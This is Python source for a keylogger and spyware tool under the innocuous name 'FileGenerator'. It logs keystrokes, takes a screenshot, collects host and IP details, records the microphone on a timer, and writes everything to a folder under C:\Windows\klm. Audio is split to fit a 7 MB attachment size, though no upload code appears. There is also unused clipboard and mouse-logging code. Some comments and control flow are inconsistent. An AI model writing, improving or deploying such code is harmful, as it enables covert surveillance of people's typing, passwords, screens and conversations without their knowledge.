import logging
import os
import platform
import socket
import time
import wave
import pyscreenshot
import sounddevice as sd
import pyperclip
from pynput import keyboard
from pynput.keyboard import Listener
import threading
import math

# Set up logging
log_directory = "C:\\Windows\\klm\\logs"
output_directory = "C:\\Windows\\klm\\output"
os.makedirs(log_directory, exist_ok=True)
os.makedirs(output_directory, exist_ok=True)
logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'),
                    level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

VERSION = "1.0.2"
MICROPHONE_INTERVAL = 4500  # 1 hour and 15 minutes in seconds
MICROPHONE_DURATION = 30  # 3 minutes in seconds
MAX_ATTACHMENT_SIZE = 7 * 1024 * 1024  # 7 MB
KLM_DIRECTORY = "C:\\Windows\\klm"

class FileGenerator:
    def __init__(self):
        self.log = "File Generation Started..."
        logging.info("FileGenerator initialized")

    def appendlog(self, string):
        self.log += string

    def on_move(self, x, y):
        current_move = "Mouse moved to {} {}\n".format(x, y)
        self.appendlog(current_move)

    def on_click(self, x, y, button, pressed):
        current_click = "Mouse clicked at {} {} with {}\n".format(x, y, button)
        self.appendlog(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = "Mouse scrolled at {} {} with {}\n".format(x, y, dx, dy)
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key + "\n")
        self.save_log()

    def save_log(self):
        log_path = os.path.join(output_directory, "key_log.txt")
        with open(log_path, 'w') as log_file:
            log_file.write(self.log)
        logging.info(f"Key log saved to {log_path}")

    def get_clipboard_content(self, max_retries=5):
        for i in range(max_retries):
            try:
                return pyperclip.paste()
            except pyperclip.PyperclipException as e:
                self.appendlog(f"Error accessing clipboard (attempt {i+1}): {e}\n")
                time.sleep(1)  # Wait a bit before retrying
        return "Could not access clipboard"

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog("Hostname: {}\n".format(hostname))
        self.appendlog("IP Address: {}\n".format(ip))
        self.appendlog("Processor: {}\n".format(plat))
        self.appendlog("System: {}\n".format(system))
        self.appendlog("Machine: {}\n".format(machine))
        self.save_log()

    def microphone(self):
        try:
            fs = 44100  # Sample rate
            seconds = MICROPHONE_DURATION  # Duration of recording
            audio_path = os.path.join(output_directory, "audio_log.wav")

            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
            sd.wait()  # Wait until recording is finished

            # Save as WAV file
            with wave.open(audio_path, 'wb') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)  # 2 bytes per sample
                wf.setframerate(fs)
                wf.writeframes(myrecording.tobytes())

            audio_size = os.path.getsize(audio_path)
            logging.info(f"Recorded audio size: {audio_size} bytes")
            if audio_size > MAX_ATTACHMENT_SIZE:
                logging.info("Splitting audio file due to size")
                self.split_audio_file(audio_path)
            else:
                logging.info(f"Audio file saved to {audio_path}")
        except Exception as e:
            self.appendlog(f"Failed to record audio: {e}\n")
            logging.error(f"Failed to record audio: {e}")

    def split_audio_file(self, audio_path):
        chunk_size = MAX_ATTACHMENT_SIZE - 1024 * 1024  # 6 MB
        with wave.open(audio_path, 'rb') as wf:
            params = wf.getparams()
            total_frames = wf.getnframes()
            frames_per_chunk = chunk_size // (params.sampwidth * params.nchannels)
            num_chunks = math.ceil(total_frames / frames_per_chunk)

            for i in range(num_chunks):
                chunk_path = os.path.join(output_directory, f"audio_log_part_{i+1}.wav")
                with wave.open(chunk_path, 'wb') as chunk_wf:
                    chunk_wf.setparams(params)
                    frames = wf.readframes(frames_per_chunk)
                    chunk_wf.writeframes(frames)
                logging.info(f"Created audio chunk: {chunk_path} with size: {os.path.getsize(chunk_path)} bytes")
        os.remove(audio_path)  # Delete the original file after splitting

    def screenshot(self):
        try:
            img = pyscreenshot.grab()
            # Save screenshot in the output directory
            screenshot_path = os.path.join(output_directory, "screenshot.png")
            img.save(screenshot_path)
            logging.info(f"Screenshot saved to {screenshot_path}")
        except Exception as e:
            self.appendlog("Failed to take screenshot: {}\n".format(e))
            logging.error(f"Failed to take screenshot: {e}")

    def run(self):
        # Start the microphone report timer
        mic_timer = threading.Timer(MICROPHONE_INTERVAL, self.microphone)
        mic_timer.daemon = True
        mic_timer.start()

        # Take a screenshot initially
        self.screenshot()

        # Capture system information
        self.system_information()

        # Start the keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

file_generator = FileGenerator()
file_generator.run()
